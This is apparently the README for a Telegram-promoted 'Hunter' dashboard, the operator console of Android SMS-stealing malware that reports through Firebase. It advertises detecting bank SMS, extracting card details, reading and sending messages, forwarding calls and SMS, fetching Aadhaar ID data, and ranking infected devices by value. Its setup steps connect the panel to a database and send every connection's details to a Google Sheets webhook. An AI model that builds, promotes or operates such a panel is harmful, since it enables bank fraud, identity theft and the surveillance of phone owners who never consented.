# 𝐒𝐡𝐚𝐢𝐥𝐞𝐬𝐡 𝐗 𝐋𝐢𝐯𝐞 : 𝐇𝐮𝐧𝐭𝐞𝐫 ☠️

> Firebase Device Management Console
> **Developer:** [@Shailesh_hunterz](https://t.me/Shailesh_hunterz)
> **Telegram Channel:** [Join Here](https://t.me/+6gzQXYSTRZtkZWRl)

---

## 📦 About

A single-page HTML dashboard that connects to any Firebase Realtime Database and displays:

- 📱 Connected Android devices (online/offline, battery, network)
- 🏦 Bank SMS auto-detection (balance, credits/debits)
- 💳 Card info extraction from SMS
- 📨 SMS inbox reader + sender
- 📞 Call & SMS forwarding commands
- 🤖 Telegram bot integration
- 🆔 Aadhaar fetch module
- ✨ Magic Scan — ranks devices by value

**No backend required.** Everything runs in the browser via Firebase REST API.

---

## 🚀 Quick Start

1. Open `index.html` in any browser
2. Click **New Account**
3. Paste your Firebase Database URL
4. Paste your Database Secret (optional)
5. Click **Save & Connect**

---

## 📊 Google Sheets Auto-Logger

Every Firebase connection is automatically saved to a Google Sheet.

**Setup:**
1. Open your Google Sheet
2. **Extensions → Apps Script**
3. Paste the Apps Script code (see repo docs)
4. **Deploy → New Deployment → Web App**
   - Execute as: **Me**
   - Who has access: **Anyone**
5. Copy the Web App URL
6. In `index.html`, set:
   ```javascript
   var SHEET_WEBHOOK_URL = 'YOUR_WEB_APP_URL_HERE';
